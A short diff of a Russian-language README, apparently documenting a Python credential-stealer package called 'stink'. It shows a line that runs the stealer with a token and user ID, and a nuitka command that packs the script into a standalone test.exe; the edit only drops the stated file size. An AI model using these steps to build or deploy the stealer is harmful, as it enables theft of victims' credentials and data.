@@ -136,4 +136,4 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
-После выполнения команды получаем test.exe файл весом в 234 КБ.
+После выполнения команды получаем test.exe файл.
